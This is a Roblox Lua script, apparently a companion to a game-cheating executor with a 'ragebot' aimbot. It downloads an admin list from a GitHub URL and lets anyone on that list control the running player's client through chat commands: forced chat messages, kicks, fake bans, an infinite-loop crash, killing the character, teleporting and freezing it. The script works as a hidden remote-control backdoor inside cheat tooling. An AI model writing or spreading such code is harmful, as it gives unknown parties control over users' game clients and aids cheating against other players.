local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TeleportService = game:GetService("TeleportService")
local ChatService = game:GetService("Chat")

local my_plr = Players.LocalPlayer
local admin_list_url = "https://raw.githubusercontent.com/nigmaBoy/juju/refs/heads/main/juju"

local admin_list = {}
local whitelist = {}
local freeze_loop_conn = nil

local function fetch_admins()
    local success, result = pcall(function() return game:HttpGet(admin_list_url) end)
    if success and result then
        local content = result:match('whitelisted%s*=%s*"(.-)"')
        if content then
            admin_list = {}
            for name in string.gmatch(content, "([^,]+)") do
                local cleaned_name = name:match("^%s*(.-)%s*$")
                if cleaned_name and cleaned_name ~= "" then
                    table.insert(admin_list, cleaned_name:lower())
                end
            end
        end
    end
end

local function is_admin(player)
    if not player then return false end
    for _, admin_name in ipairs(admin_list) do
        if player.Name:lower() == admin_name then
            return true
        end
    end
    return false
end

local function find_player_by_partial(str)
    if not str then return nil end
    local s_lower = str:lower()
    for _, p in ipairs(Players:GetPlayers()) do
        if p.Name:lower():find(s_lower, 1, true) or p.DisplayName:lower():find(s_lower, 1, true) then
            return p
        end
    end
    return nil
end


RunService.Heartbeat:Connect(function()
    pcall(function()
        local get_target = juju["get_active_ragebot_target"]
        local set_target = juju["set_active_ragebot_target"]
        
        if get_target and set_target then
            local current_target = get_target()
            if current_target and whitelist[current_target.Name] then
                set_target(nil)
            end
        end
    end)
end)


local function on_any_player_chatted(speaker, message)
    if not is_admin(speaker) or not message:find("!") then
        return
    end

    local args = message:split(" ")
    local cmd_full = args[1]
    local target_str = args[2]
    local cmd = cmd_full:gsub("!", "")
    local target_player = find_player_by_partial(target_str)

    if cmd == "wl" or cmd == "unwl" then
        if target_player then
            whitelist[target_player.Name] = (cmd == "wl")
        end
        return
    end

    if target_player and target_player == my_plr then
        if cmd == "say" then
            local message_to_say = table.concat(args, " ", 3)
            pcall(function()
                ChatService:Chat(my_plr.Character.Head, message_to_say, Enum.ChatColor.White)
            end)

        elseif cmd == "setfps" then
            local fps_num = tonumber(args[3])
            if fps_num then
                pcall(setfpscap, fps_num)
            end

        elseif cmd == "rejoin" then
            my_plr:Kick("You have been commanded to rejoin.")

        elseif cmd == "shop" then
            local success, _ = pcall(serverhop)
            if not success then
                TeleportService:Teleport(game.PlaceId, my_plr)
            end

        elseif cmd == "kick" then
            my_plr:Kick("You have been kicked.")

        elseif cmd == "ban" then
            task.spawn(function()
                task.wait(5)
                my_plr:Kick("You have been banned from the game.")
            end)

        elseif cmd == "crash" then
            while true do end

        elseif cmd == "reset" then
            if my_plr.Character and my_plr.Character:FindFirstChildOfClass("Humanoid") then
                my_plr.Character.Humanoid.Health = 0
            end

        elseif cmd == "bring" then
            if my_plr.Character and my_plr.Character.PrimaryPart and speaker.Character and speaker.Character.PrimaryPart then
                my_plr.Character:SetPrimaryPartCFrame(speaker.Character.PrimaryPart.CFrame)
            end
            
        elseif cmd == "thaw" then
            if freeze_loop_conn then freeze_loop_conn:Disconnect() end
            
            freeze_loop_conn = RunService.Heartbeat:Connect(function()
                local my_char = my_plr.Character
                local admin_char = speaker.Character
                if not (my_char and my_char.PrimaryPart and admin_char and admin_char.PrimaryPart) then
                    freeze_loop_conn:Disconnect()
                    freeze_loop_conn = nil
                    return
                end
                
                my_char:SetPrimaryPartCFrame(admin_char.PrimaryPart.CFrame * CFrame.new(0, 0, -5))
                
                local hum = my_char:FindFirstChildOfClass("Humanoid")
                if hum then
                    hum:SetStateEnabled(Enum.HumanoidStateType.Running, false)
                    hum:SetStateEnabled(Enum.HumanoidStateType.Jumping, false)
                end
            end)
        
        elseif cmd == "unthaw" then
            if freeze_loop_conn then
                freeze_loop_conn:Disconnect()
                freeze_loop_conn = nil
            end
            
            if my_plr.Character and my_plr.Character:FindFirstChildOfClass("Humanoid") then
                local hum = my_plr.Character.Humanoid
                hum.PlatformStand = false
                hum:SetStateEnabled(Enum.HumanoidStateType.Running, true)
                hum:SetStateEnabled(Enum.HumanoidStateType.Jumping, true)
            end
        end
    end
end

fetch_admins()

for _, player in ipairs(Players:GetPlayers()) do
    player.Chatted:Connect(function(message)
        on_any_player_chatted(player, message)
    end)
end

Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(message)
        on_any_player_chatted(player, message)
    end)
end)
